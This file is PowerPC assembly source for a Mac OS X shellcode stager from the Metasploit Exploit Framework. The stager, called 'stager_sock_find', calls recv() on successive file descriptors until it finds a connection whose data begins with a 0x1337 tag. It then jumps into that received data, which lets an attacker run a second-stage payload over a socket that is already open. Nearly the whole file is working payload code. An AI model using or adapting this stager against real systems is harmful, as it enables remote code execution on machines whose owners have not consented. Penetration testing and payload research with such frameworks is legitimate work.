;;
;
;        Name: stager_sock_find
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload will recv() downward until the read
;        data contains the search tag (0xXXXX1337). Once the
;        tag is located, it will jump into the payload.
;
;;

.globl _main
.text
_main:
	li 	r29, 0xfff
	li	r30, 0xfff
	addic.	r28, r29, -0xfff +1

findsock:
	subf.   r30, r28, r30
	blt	_main

	subi	r0, r29, 0xfff - 102
	mr	r3, r30
	subi	r4, r1, 4104
	li 	r5, 4095
	subi    r6, r29, 0xfff - 0x80
	.long   0x44ffff02
	xor.	r6, r6, r6
	
	lhz	r27, -4104(r1)
	cmpwi	r27, 0x1337
	bne	findsock

gotsock:
	subi	r4, r1, 4100
	mtctr	r4
	blectr	
	xor.	r6, r6, r6
